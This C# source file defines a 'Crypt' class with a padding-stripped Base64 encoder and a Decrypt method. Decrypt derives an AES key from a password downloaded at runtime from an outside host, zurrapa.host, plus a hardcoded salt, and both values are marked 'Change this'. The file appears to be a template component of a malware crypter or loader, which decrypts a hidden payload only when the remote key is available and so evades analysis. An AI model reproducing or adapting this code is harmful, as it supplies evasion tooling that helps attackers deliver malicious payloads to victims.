using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Net;
using SecuritySpace;

namespace Encode
{
    class Crypt
    {
        public static string Encode(string plainText)
        {
            var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
            string result = Convert.ToBase64String(plainTextBytes);
            if (result.Contains("="))
            {
                result = result.Substring(0, result.IndexOf("="));
            }
            return result;
        }

        public static byte[] Decrypt(byte[] input)
        {
            PasswordDeriveBytes pdb =
          new PasswordDeriveBytes(new WebClient().DownloadString("http://zurrapa.host/bm9LYXBwYQ"), // Change this
          new byte[] { 0x13, 0x37, 0x42, 0x0 }); // Change this
            MemoryStream ms = new MemoryStream();
            Aes aes = new AesManaged();
            aes.Key = pdb.GetBytes(aes.KeySize / 8);
            aes.IV = pdb.GetBytes(aes.BlockSize / 8);
            CryptoStream cs = new CryptoStream(ms,
              aes.CreateDecryptor(), CryptoStreamMode.Write);
            cs.Write(input, 0, input.Length);
            cs.Close();
            return ms.ToArray();
        }
    }
}
